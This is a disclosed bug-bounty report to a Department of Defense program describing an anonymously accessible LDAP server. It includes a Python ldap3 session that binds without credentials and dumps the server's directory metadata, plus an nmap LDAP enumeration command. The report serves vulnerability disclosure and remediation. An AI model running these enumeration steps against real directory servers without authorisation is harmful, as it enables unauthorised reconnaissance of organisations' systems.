# LDAP Anonymous Login enabled in ████

## Report Details
- **Report ID**: 2081332
- **URL**: https://hackerone.com/reports/2081332
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-07-24T07:27:47.761Z
- **Disclosed**: 2023-09-08T17:16:54.754Z

## Reporter
- **Username**: shuvam321
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
The host ██████████ has anonymous LDAP login enabled, which means that anyone can connect to the LDAP server without providing any authentication credentials. This allows unauthorized users to perform LDAP queries, potentially retrieving sensitive information such as user details, organizational data, or other critical information stored in the LDAP directory.

## References
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

## Impact

Attackers can exploit this vulnerability to gain unauthorized access to the LDAP server and retrieve sensitive information stored within the directory. Attackers can use the gathered information to perform further attacks, including privilege escalation, or targeted attacks against the system or its users.

## System Host(s)
████

## Affected Product(s) and Version(s)
LADP

## CVE Numbers


## Steps to Reproduce
## Proof Hosts Belong to DoD

██████

1. First install ldap3 using pip3 and run the following command.

```
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ldap3==
>>> server = ldap3.Server('██████████', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
DSA info (from DSE):
  Supported LDAP versions: 2, 3
  Naming contexts: 
    dc=satx,dc=disa,dc=mil
    uid=Monitor
    cn=iasdsadmin
  Supported controls: 
    1.2.826.0.1.3344810.2.3 - Matched Values - Control - RFC3876
    1.2.840.113556.1.4.1413 - Permissive modify - Control - MICROSOFT
    1.2.840.113556.1.4.319 - LDAP Simple Paged Results - Control - RFC2696
    1.2.840.113556.1.4.473 - Sort Request - Control - RFC2891
    1.2.840.113556.1.4.805 - Tree delete - Control - MICROSOFT
    1.3.6.1.1.12 - Assertion - Control - RFC4528
    1.3.6.1.1.13.1 - LDAP Pre-read - Control - RFC4527
    1.3.6.1.1.13.2 - LDAP Post-read - Control - RFC4527
    1.3.6.1.4.1.26027.1.5.2 - Replication repair - Control - OpenDS
    1.3.6.1.4.1.26027.1.5.4
    1.3.6.1.4.1.36733.2.1.5.1
    1.3.6.1.4.1.36733.2.1.5.5
    1.3.6.1.4.1.42.2.27.8.5.1 - Password policy - Control - IETF DRAFT behera-ldap-password-policy
    1.3.6.1.4.1.42.2.27.9.5.2 - Get effective rights - Control - IETF DRAFT draft-ietf-ldapext-acl-model
    1.3.6.1.4.1.42.2.27.9.5.8 - Account usability - Control - SUN microsystems
    1.3.6.1.4.1.4203.1.10.1 - Subentries - Control - RFC3672
    1.3.6.1.4.1.4203.1.10.2 - No-Operation - Control - IETF DRAFT draft-zeilenga-ldap-noop
    1.3.6.1.4.1.4203.666.5.12
    1.3.6.1.4.1.7628.5.101.1 - LDAP subentries - Control - IETF DRAFT draft-ietf-ldup-subentry
    2.16.840.1.113730.3.4.12 - Proxied Authorization (old) - Control - Netscape
    2.16.840.1.113730.3.4.16 - Authorization Identity Request Control - Control - RFC3829
    2.16.840.1.113730.3.4.17 - Real attribute only request - Control - Netscape
    2.16.840.1.113730.3.4.18 - Proxy Authorization Control - Control - RFC6171
    2.16.840.1.113730.3.4.19 - Chaining loop detection - Control - Netscape
    2.16.840.1.113730.3.4.2 - ManageDsaIT - Control - RFC3296
    2.16.840.1.113730.3.4.3 - Persistent Search - Control - IETF
    2.16.840.1.113730.3.4.4 - Netscape Password Expired - Control - Netscape
    2.16.840.1.113730.3.4.5 - Netscape Password Expiring - Control - Netscape
    2.16.840.1.113730.3.4.9 - Virtual List View Request - Control - IETF
  Supported extensions: 
    1.3.6.1.1.8 - Cancel Operation - Extension - RFC3909
    1.3.6.1.4.1.1466.20037 - StartTLS - Extension - RFC4511-RFC4513
    1.3.6.1.4.1.26027.1.6.1 - Password policy state - Control - OpenDS
    1.3.6.1.4.1.26027.1.6.2 - Get connection ID - Control - OpenDS
    1.3.6.1.4.1.26027.1.6.3 - Get symmetric key - Control - OpenDS
    1.3.6.1.4.1.4203.1.11.1 - Modify Password - Extension - RFC3062
    1.3.6.1.4.1.4203.1.11.3 - Who am I - Extension - RFC4532
  Supported features: 
    1.3.6.1.1.14 - Modify-Increment - Feature - RFC4525
    1.3.6.1.4.1.4203.1.5.1 - All Op Attrs - Feature - RFC3673
    1.3.6.1.4.1.4203.1.5.2 - OC AD Lists - Feature - RFC4529
    1.3.6.1.4.1.4203.1.5.3 - True/False filters - Feature - RFC4526
  Supported SASL mechanisms: 
    SCRAM-SHA-512, PLAIN, EXTERNAL, SCRAM-SHA-256
  Schema entry: 
    cn=schema
Vendor name: ForgeRock AS.
Vendor version: ForgeRock Directory Services 7.3.0-20230323223207-47dd3dc1b26e0d8a982cad26d51b3a91ed1e9309
Other:
  objectClass: 
    top
    ds-root-dse
  alive: 
    true
  fullVendorVersion: 
    7.3.0.47dd3dc1b26e0d8a982cad26d51b3a91ed1e9309
  healthy: 
    true
  supportedAuthPasswordSchemes: 
    SCRAM-SHA-512
    PBKDF2-HMAC-SHA256
    SCRAM-SHA-256
    PBKDF2-HMAC-SHA512
  supportedTLSCiphers: 
    TLS_AES_128_GCM_SHA256
    TLS_AES_256_GCM_SHA384
    TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
    TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    TLS_EMPTY_RENEGOTIATION_INFO_SCSV
  supportedTLSProtocols: 
    TLSv1.2
    TLSv1.3
```


2. You will get information about the LDAP server, including supported LDAP versions, naming contexts, supported controls, supported extensions, supported features, supported SASL mechanisms, vendor information, and other details.

## Nmap Command to Enumerate the Information:

```
nmap -n -sV --script "ldap* and not brute" -p 389 ████████
```

█████

## Suggested Mitigation/Remediation Actions
Modify the LDAP server configuration to disable anonymous access and require authentication for all LDAP queries & configure proper access control .



## Attachments
No attachments
